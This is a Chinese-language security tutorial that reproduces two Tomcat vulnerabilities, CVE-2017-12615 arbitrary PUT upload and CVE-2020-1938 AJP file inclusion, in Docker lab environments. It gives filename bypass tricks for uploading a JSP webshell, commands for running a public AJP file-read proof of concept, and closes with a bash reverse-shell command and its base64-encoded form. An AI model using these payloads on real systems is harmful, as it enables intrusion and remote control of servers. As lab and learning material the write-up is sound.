# 简介
Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta
项目中的一个核心项目，由[Apache](https://baike.baidu.com/item/Apache/6265)、Sun
和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat
5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java
爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。
Tomcat 服务器是一个免费的开放源代码的Web
应用服务器，属于轻量级应用[服务器](https://baike.baidu.com/item/服务器)，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP
程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache
服务器，可利用它响应[HTML](https://baike.baidu.com/item/HTML)（[标准通用标记语言](https://baike.baidu.com/item/标准通用标记语言/6805073)下的一个应用）页面的访问请求。实际上Tomcat是Apache
服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。
诀窍是，当配置正确时，Apache 为HTML页面服务，而Tomcat 实际上运行JSP
页面和Servlet。另外，Tomcat和[IIS](https://baike.baidu.com/item/IIS)等Web服务器一样，具有处理HTML页面的功能，另外它还是一个Servlet和JSP容器，独立的Servlet容器是Tomcat的默认模式。不过，Tomcat处理静态[HTML](https://baike.baidu.com/item/HTML)的能力不如Apache服务器。目前Tomcat最新版本为10.0.5。
# CVE-2017-12615
CVE-2017-12615对应的漏洞为任意文件写入，主要影响的是Tomcat的7.0.0-7.0.81这几个版本
## 漏洞原理
由于配置不当（非默认配置），将配置文件`conf/web.xml`中的`readonly`设置为了
false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀的上传
根据描述，在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码
通过阅读 conf/web.xml 文件，可以发现，默认 readonly 为 true，当 readonly 设置为 false 时，可以通过 PUT /
DELETE 进行文件操控
## 漏洞复现
这里使用vuluhub的docker进行漏洞复现，这里就不详细介绍环境搭建了
首先进入CVE-2017-12615的docker环境
    sudo docker-compose up -d
    docker ps   //查看docker环境是否启动成功
这里首先进入docker里查看一下`web.xml`的代码，可以看到这里`readonly`设置为`false`，所以存在漏洞
    sudo docker exec -ti ec bash    //进入docker容器
    cat conf/web.xml | grep readonly
访问下8080端口，对应的是`Tomcat 8.5.19`
在8080端口进行抓包，这里发现是一个`GET`方法
这里首先测试一下，改为`PUT`方法写入一个`test.txt`，这里看到返回201，应该已经上传成功了
    PUT /test.txt HTTP/1.1
    testpoc
这里进入docker查看一下已经写入成功了
    cd /usr/local/tomcat/webapps/ROOT
    ls
之前说过，使用PUT方法上传任意文件，但限制了jsp后缀的上传，这里首先使用PUT方法直接上传一个冰蝎的jsp上去，发现返回的是404，应该是被拦截了
这里就需要进行绕过，这里绕过有三种方法
    1.Windows下不允许文件以空格结尾
    以PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格
    2.Windows NTFS流
    Put/a001.jsp::$DATA HTTP/1.1
    3. /在文件名中是非法的，也会被去除（Linux/Windows）
    Put/a001.jsp/http:/1.1
首先使用`%20`绕过。我们知道`%20`对应的是空格，在windows中若文件这里在jsp后面添加`%20`即可达到自动抹去空格的效果。例如:`"phpinfo.php
"`Windows会自动去掉末尾的空格变成`"phpinfo.php"`
这里看到返回201已经上传成功了
进入docker查看一下，确认是上传上去了
第二种方法为在jsp后缀后面使用`/`，因为`/`在文件名中是非法的，在windows和linux中都会自动去除。根据这个特性，上传`/ice1.jsp/`，看到返回201
进入docker查看发现已经上传成功
第三种方法就是使用Windows NTFS流，那么什么是NTFS流呢？
> 流文件，即NTFS交换数据流（alternate data
> streams，简称ADS），是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无法看到数据流文件，但是它却是真实存在于我们的系统中的。创建一个数据交换流文件的方法很简单，命令为“宿主文件:准备与宿主文件关联的数据流文件”。
>
>
> 这是一个全新的概念，但是在NTFS诞生之时就早已有之，我们平时也接触到了，但是并不知道是流文件在起作用，那么，比如我们下载个程序，下载完成后，运行他会提示一个对话框要不要运行他，还有一个复选框，“以后都不用提示了”。这个就是流文件起的作用，如果我们删除他的流文件，这个对话框就不会再提示了。但是，流文件，在Windows中是没有提供命令和方法去操作他，我们看不到，也无法修改，不过微软的Sysinternals工具包中的streams程序专门提供了对流文件的操作，另外ARK软件也提供了相关功能，但仅仅是让你看到这个文件的存在以及删除这个文件，一共2个功能。
那么这里我们用到NTFS文件系统的存储数据流的一个属性DATA ，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如
a.asp:lake2.asp，请求 a.asp:lake2.asp::$DATA，则是请求a.asp中的流数据lake2.asp的流数据内容。
在jsp后面添加`::$DATA`，看到返回201，上传成功
进入docker验证一下
这里随便连接一个jsp即可拿到webshell
# CVE-2020-1938
CVE-2020-1938为Tomcat AJP文件包含漏洞。由长亭科技安全研究员发现的存在于 Tomcat中的安全漏洞，由于 Tomcat
AJP协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector可以读取或包含 Tomcat上所有 webapp目录下的任意文件，例如可以读取
webapp配置文件或源码。
此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。
## 漏洞原理
Tomcat 配置了两个Connecto，它们分别是 HTTP 和 AJP
：HTTP默认端口为8080，处理http请求，而AJP默认端口8009，用于处理 AJP
协议的请求，而AJP比http更加优化，多用于反向、集群等，漏洞由于Tomcat
AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件以及可以包含任意文件，如果有某上传点，上传图片马等等，即可以获取shell
tomcat默认的conf/server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009
AJP协议端口，两个端口默认均监听在外网ip。
tomcat在接收ajp请求的时候调用org.apache.coyote.ajp.AjpProcessor来处理ajp消息，prepareRequest将ajp里面的内容取出来设置成request对象的Attribute属性
因此可以通过此种特性从而可以控制request对象的下面三个Attribute属性
    javax.servlet.include.request_uri
    javax.servlet.include.path_info
    javax.servlet.include.servlet_path
然后封装成对应的request之后,继续走servlet的映射流程如下
## 漏洞复现
启动CVE-2020-1938的docker环境
首先使用poc进行漏洞检测，若存在漏洞则可以查看webapps目录下的所有文件
    git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
    cd CNVD-2020-10487-Tomcat-Ajp-lfi
    python CNVD-2020-10487-Tomcat-Ajp-lfi.py    #py2环境
这里查看8009端口下的`web.xml`文件
    python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.8 -p 8009 -f /WEB-INF/web.xml
使用bash反弹shell
    bash -i >& /dev/tcp/192.168.1.8/8888 0>&1
因为是java的原因所以需要转换一下，使用
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}